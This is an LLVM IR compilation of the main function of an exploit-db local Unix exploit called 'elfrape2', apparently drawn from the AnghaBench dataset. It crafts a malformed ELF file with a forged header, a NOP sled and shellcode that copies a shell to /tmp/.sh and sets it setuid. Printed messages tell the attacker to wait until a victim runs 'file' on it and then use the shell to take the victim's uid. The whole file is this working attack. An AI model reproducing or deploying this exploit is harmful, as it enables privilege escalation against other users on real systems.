; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22325.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22325.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32*, i32, i32, i32, i32, i32, i32, i32 }

@FILESIZE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [14 x i8] c"malloc error\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"Usage: %s <filename> <bsd|linux>\0A\00", align 1
@linux_code = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [4 x i8] c"ash\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"strdup error\0A\00", align 1
@bsd_code = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [5 x i8] c"tcsh\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"Invalid target os\0A\00", align 1
@.str.6 = private unnamed_addr constant [67 x i8] c"elfrape2, using cp /bin/%s /tmp/.sh;chmod 4755 /tmp/.sh shellcode\0A\00", align 1
@.str.7 = private unnamed_addr constant [42 x i8] c"Using %s shellcode, %d bytes for file %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"BSD\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"LINUX\00", align 1
@ET_EXEC = common dso_local global i32 0, align 4
@EM_VPP500 = common dso_local global i32 0, align 4
@EV_CURRENT = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [7 x i8] c"open()\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"write()\00", align 1
@.str.12 = private unnamed_addr constant [62 x i8] c"Use /tmp/.sh to gain the targets uid once they run 'file %s'\0A\00", align 1
@.str.13 = private unnamed_addr constant [51 x i8] c"Make sure the shell you copied doesn't drop privs\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.TYPE_2__*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @FILESIZE, align 4
  %15 = call i64 @malloc(i32 %14)
  %16 = inttoptr i64 %15 to i8*
  store i8* %16, i8** %9, align 8
  %17 = icmp ne i8* %16, null
  br i1 %17, label %22, label %18

18:                                               ; preds = %2
  %19 = load i32, i32* @stderr, align 4
  %20 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 @exit(i32 -1) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i8*, i8** %9, align 8
  %24 = bitcast i8* %23 to %struct.TYPE_2__*
  store %struct.TYPE_2__* %24, %struct.TYPE_2__** %13, align 8
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %25, 3
  br i1 %26, label %27, label %34

27:                                               ; preds = %22
  %28 = load i32, i32* @stderr, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i32, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i8* %31)
  %33 = call i32 @exit(i32 -1) #3
  unreachable

34:                                               ; preds = %22
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 0
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  switch i32 %40, label %59 [
    i32 108, label %41
    i32 76, label %41
    i32 98, label %50
    i32 66, label %50
  ]

41:                                               ; preds = %34, %34
  %42 = load i8*, i8** @linux_code, align 8
  store i8* %42, i8** %7, align 8
  %43 = call i8* @strdup(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  store i8* %43, i8** %8, align 8
  %44 = icmp ne i8* %43, null
  br i1 %44, label %49, label %45

45:                                               ; preds = %41
  %46 = load i32, i32* @stderr, align 4
  %47 = call i32 (i32, i8*, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %48 = call i32 @exit(i32 -1) #3
  unreachable

49:                                               ; preds = %41
  br label %63

50:                                               ; preds = %34, %34
  %51 = load i8*, i8** @bsd_code, align 8
  store i8* %51, i8** %7, align 8
  %52 = call i8* @strdup(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  store i8* %52, i8** %8, align 8
  %53 = icmp ne i8* %52, null
  br i1 %53, label %58, label %54

54:                                               ; preds = %50
  %55 = load i32, i32* @stderr, align 4
  %56 = call i32 (i32, i8*, ...) @fprintf(i32 %55, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %57 = call i32 @exit(i32 -1) #3
  unreachable

58:                                               ; preds = %50
  br label %63

59:                                               ; preds = %34
  %60 = load i32, i32* @stderr, align 4
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %60, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  %62 = call i32 @exit(i32 -1) #3
  unreachable

63:                                               ; preds = %58, %49
  %64 = load i32, i32* @stderr, align 4
  %65 = load i8*, i8** %8, align 8
  %66 = call i32 (i32, i8*, ...) @fprintf(i32 %64, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.6, i64 0, i64 0), i8* %65)
  %67 = load i8*, i8** %7, align 8
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 1
  %70 = load i8*, i8** %69, align 8
  %71 = load i8*, i8** %8, align 8
  %72 = call i8* @prepare_code(i8* %67, i8* %70, i8* %71, i32* %12)
  store i8* %72, i8** %6, align 8
  %73 = load i32, i32* @stderr, align 4
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 2
  %76 = load i8*, i8** %75, align 8
  %77 = getelementptr inbounds i8, i8* %76, i64 0
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 98
  %81 = zext i1 %80 to i64
  %82 = select i1 %80, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0)
  %83 = load i32, i32* %12, align 4
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 (i32, i8*, ...) @fprintf(i32 %73, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.7, i64 0, i64 0), i8* %82, i32 %83, i8* %86)
  %88 = load i8*, i8** %9, align 8
  %89 = load i32, i32* @FILESIZE, align 4
  %90 = call i32 @memset(i8* %88, i32 144, i32 %89)
  %91 = load i8*, i8** %9, align 8
  %92 = call i32 @memset(i8* %91, i32 0, i32 40)
  %93 = load i8*, i8** %9, align 8
  %94 = load i32, i32* @FILESIZE, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i32, i32* %12, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 0, %98
  %100 = getelementptr inbounds i8, i8* %96, i64 %99
  %101 = load i8*, i8** %6, align 8
  %102 = load i32, i32* %12, align 4
  %103 = call i32 @memcpy(i8* %100, i8* %101, i32 %102)
  %104 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %105 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %104, i32 0, i32 0
  %106 = load i32*, i32** %105, align 8
  %107 = getelementptr inbounds i32, i32* %106, i64 0
  store i32 127, i32* %107, align 4
  %108 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %109 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %108, i32 0, i32 0
  %110 = load i32*, i32** %109, align 8
  %111 = getelementptr inbounds i32, i32* %110, i64 1
  store i32 69, i32* %111, align 4
  %112 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %113 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %112, i32 0, i32 0
  %114 = load i32*, i32** %113, align 8
  %115 = getelementptr inbounds i32, i32* %114, i64 2
  store i32 76, i32* %115, align 4
  %116 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %117 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %116, i32 0, i32 0
  %118 = load i32*, i32** %117, align 8
  %119 = getelementptr inbounds i32, i32* %118, i64 3
  store i32 70, i32* %119, align 4
  %120 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %121 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %120, i32 0, i32 0
  %122 = load i32*, i32** %121, align 8
  %123 = getelementptr inbounds i32, i32* %122, i64 4
  store i32 1, i32* %123, align 4
  %124 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %125 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %124, i32 0, i32 0
  %126 = load i32*, i32** %125, align 8
  %127 = getelementptr inbounds i32, i32* %126, i64 5
  store i32 1, i32* %127, align 4
  %128 = load i32, i32* @ET_EXEC, align 4
  %129 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %130 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %129, i32 0, i32 7
  store i32 %128, i32* %130, align 8
  %131 = load i32, i32* @EM_VPP500, align 4
  %132 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %133 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %132, i32 0, i32 6
  store i32 %131, i32* %133, align 4
  %134 = load i32, i32* @EV_CURRENT, align 4
  %135 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %136 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %135, i32 0, i32 5
  store i32 %134, i32* %136, align 8
  %137 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %138 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %137, i32 0, i32 1
  store i32 40, i32* %138, align 8
  %139 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %140 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %139, i32 0, i32 2
  store i32 40, i32* %140, align 4
  %141 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %142 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %141, i32 0, i32 3
  store i32 2048, i32* %142, align 8
  %143 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %144 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %143, i32 0, i32 4
  store i32 1, i32* %144, align 4
  store i32 0, i32* %11, align 4
  br label %145

145:                                              ; preds = %162, %63
  %146 = load i32, i32* %11, align 4
  %147 = icmp slt i32 %146, 256
  br i1 %147, label %148, label %165

148:                                              ; preds = %145
  %149 = call i32 (...) @get_sp()
  %150 = sub nsw i32 %149, 1500
  %151 = sext i32 %150 to i64
  %152 = load i8*, i8** %9, align 8
  %153 = load %struct.TYPE_2__*, %struct.TYPE_2__** %13, align 8
  %154 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %153, i32 0, i32 2
  %155 = load i32, i32* %154, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8, i8* %152, i64 %156
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8, i8* %157, i64 %159
  %161 = bitcast i8* %160 to i64*
  store i64 %151, i64* %161, align 8
  br label %162

162:                                              ; preds = %148
  %163 = load i32, i32* %11, align 4
  %164 = add nsw i32 %163, 4
  store i32 %164, i32* %11, align 4
  br label %145

165:                                              ; preds = %145
  %166 = load i8**, i8*** %5, align 8
  %167 = getelementptr inbounds i8*, i8** %166, i64 1
  %168 = load i8*, i8** %167, align 8
  %169 = load i32, i32* @O_WRONLY, align 4
  %170 = load i32, i32* @O_CREAT, align 4
  %171 = or i32 %169, %170
  %172 = load i32, i32* @O_TRUNC, align 4
  %173 = or i32 %171, %172
  %174 = call i32 @open(i8* %168, i32 %173)
  store i32 %174, i32* %10, align 4
  %175 = icmp slt i32 %174, 0
  br i1 %175, label %176, label %179

176:                                              ; preds = %165
  %177 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0))
  %178 = call i32 @exit(i32 -1) #3
  unreachable

179:                                              ; preds = %165
  %180 = load i32, i32* %10, align 4
  %181 = load i8*, i8** %9, align 8
  %182 = load i32, i32* @FILESIZE, align 4
  %183 = call i32 @write(i32 %180, i8* %181, i32 %182)
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %188

185:                                              ; preds = %179
  %186 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0))
  %187 = call i32 @exit(i32 -1) #3
  unreachable

188:                                              ; preds = %179
  %189 = load i32, i32* %10, align 4
  %190 = call i32 @close(i32 %189)
  %191 = load i8*, i8** %8, align 8
  %192 = call i32 @free(i8* %191)
  %193 = load i8*, i8** %6, align 8
  %194 = call i32 @free(i8* %193)
  %195 = load i32, i32* @stderr, align 4
  %196 = load i8**, i8*** %5, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 1
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 (i32, i8*, ...) @fprintf(i32 %195, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.12, i64 0, i64 0), i8* %198)
  %200 = load i32, i32* @stderr, align 4
  %201 = call i32 (i32, i8*, ...) @fprintf(i32 %200, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.13, i64 0, i64 0))
  ret i32 0
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @strdup(i8*) #1

declare dso_local i8* @prepare_code(i8*, i8*, i8*, i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
